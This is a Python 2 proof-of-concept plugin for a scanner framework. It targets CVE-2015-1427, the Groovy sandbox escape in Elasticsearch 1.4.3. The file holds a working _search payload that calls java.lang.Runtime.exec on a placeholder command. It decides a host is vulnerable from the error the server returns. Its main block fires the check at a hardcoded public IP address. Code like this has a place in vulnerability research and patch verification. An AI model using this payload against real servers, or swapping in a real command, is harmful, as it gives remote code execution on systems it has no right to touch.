#!/usr/bin/env python
# encoding: utf-8
from t import T
import requests,urllib2,json,urlparse
class P(T):
    def __init__(self):
        T.__init__(self)
        vulID = '1708'  # vul ID
        version = '1'

        vulDate = '2015-03-04'
        createDate = '2015-03-04'
        updateDate = '2015-03-04'
        references = ['http://bobao.360.cn/learning/detail/275.html']
        name = 'elasticsearch v1.43 _search 命令执行漏洞 POC'
        appPowerLink = 'http://www.elasticsearch.org'
        appName = 'elasticsearch'
        appVersion = 'v1.43'
        vulType = 'Command Execution'
        desc = '''
           脚本查询模块，由于搜索引擎支持使用脚本代码作为表达式进行数据操作，攻击
           者可以通过MVEL构造执行任意java代码，后来脚本语言引擎换成了Groovy，并且
           加入了沙盒进行控制，由于沙盒限制的不严格，导致远程代码执行
    '''
    def CVE20151427(self,url,port):
        req=None
        content=None
        try:
            target_url = "http://"+url+":"+port+"/_search"
            payload = '{"size": 1,"script_fields": {"secpulse": {"script":'   \
            ' "java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"COMMAND\\\")","lang": "groovy"}}}'
            req = urllib2.urlopen(target_url,data=payload,timeout=2)
            content = req.read()
        except Exception,e:
            content = e
        finally:

            if req:
                req.close()
                del req
            return content
    
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):

        result = {}
        content_2 = self.CVE20151427(ip,port)

        result['result']=False
        if 'Cannot run program \\\\\\\"COMMAND\\\\\\\"' in content_2:

            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='Command Execution'
            result['VerifyInfo']['level'] = 'hole'
            result['VerifyInfo']['URL'] =ip+":port/_search"
            result['VerifyInfo']['payload'] = '{"size": 1,"script_fields": {"secpulse": {"script":'   \
            ' "java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"COMMAND\\\")","lang": "groovy"}}}'

        return result
if __name__ == '__main__':
        
    print P().verify(ip='42.120.7.130',port='9200')       
        
        